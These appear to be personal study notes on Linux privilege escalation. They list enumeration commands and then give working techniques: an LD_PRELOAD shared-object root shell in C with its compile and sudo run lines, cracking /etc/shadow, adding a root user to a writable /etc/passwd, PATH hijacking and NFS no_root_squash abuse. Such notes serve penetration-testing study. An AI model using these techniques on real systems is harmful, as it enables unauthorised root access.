linux priv esc enum
```
hostname
uname -a     //kernel version
/proc/version
/etc/issue
ps
ps -A   //all processes
ps axjf  //process trees
ps aux   //processes for all users
env    //environment variables
sudo -l  //all commands user can run using sudo
ls
ls -l
ls -la  //hidden files
id
/etc/passwd
/etc/shadow
history
ifconfig
ip route
netstat
netstat -a  ///all listening ports
netstat -at or -au //list all TCP or UDP ports
netstat -l //ports in listening mode
netstat -s    //network usage statistics by protocol, use -u or -t to limit the output to a specific protocol
netstat -tp or -ltp  //connections with services names and pid
netstat -i    //interface statistics
netstat -a   //display all sockets
netstat -n    //do not resolve names
netstat -o   //display timers
find
find . -name  //find for current directory
find /home -name  //find files in the /home directory
find / -type d -name config    //find the directoru named config under /
find / -type f -perm 0777   //find files with permissions
find / -perm a=x     //find executable files
find /home -user    //find all files for a user under /home
find / -mtime 10    //find files modified in the last 10 days
find / -atime 10    //find files that were accessed in the last 10 days
find / -cmin -60     //find files changed within the last hour
find / -amin  -60    //find files accessed within the last hour
find / -size  50M   //find files with 50mb size


IMP

find / -writable -type d 2>/dev/null    //find world writable folders
find / -perm -222 -type d 2>/dev/null   //find world writable folders
find / -perm -o w -type d 2>/dev/null   // find world writeable folders

find / -perm -o x -type d 2>/dev/null   //find world executable folders
find / -name perl*
find / -name python*
find / -name gcc*

find / -perm -u=s -type f 2>/dev/null    //find files with suid bits that allows to run the file with higher privileges
locate
grep
cut
sort
```




USING KERNEL EXPLOITS
```
identify the kernel version
look for available exploits for privesc
```



SUDO
```
sudo -l   //look for commands that are running as a privileged user, check gtfobins
```



LD_PRELOAD
```
if ruid == euid
Check for LD_PRELOAD (with the env_keep option)
Write a simple C code compiled as a share object (.so extension) file
Run the program with sudo rights and the LD_PRELOAD option pointing to our .so file
```

shell.c
``````
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init()
{
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
``````


compile it using gcc
``````
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
``````
```
sudo LD_PRELOAD=/home/user/ldpreload/shell.so find

```





SUID
```
list files that have SUID or SGID set
```
``````
find / -type f -perm -04000 -ls 2>/dev/null
//compare executables on this list with gtfobins
``````

``````
look for /etc/passwd(check if writable) and /etc/shadow(check if readable)

readable /etc/shadow

#use johntheripper for contents of shadow file
unshadow passwd.txt shadow.txt > passwords.txt

#bruteforce with wordlist to retrieve several passwords
``````

``````
writable /etc/passwd

openssl passwd -1 -salt <enter-salt> <enter-password>
#add this hash value as password with a username in /etc/passwd

#add root:/bin/bash to provide a root shell
``````


CAPABILITIES
check different file capabilities
``````
getcap -r / 2>/dev/null
``````
check gtfobins for capabilities
note: you wont find capabilities when enumerating files for suid




CRONTABS
```
cat /etc/crontab
```



PATHS
```
find / -writable 2>&/dev/null

find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u

writable folders
export PATH=/add/path:$PATH

```




NFS
```
/etc/exports
check if no_root_squash 
showmount -e <target-ip>   //on attacker machine

mkdir /<mountable-share>/backupsonattacketmachine

mount -o rw <target-ip>:/backups /<mountable-share>/backupsonattackermachine
```
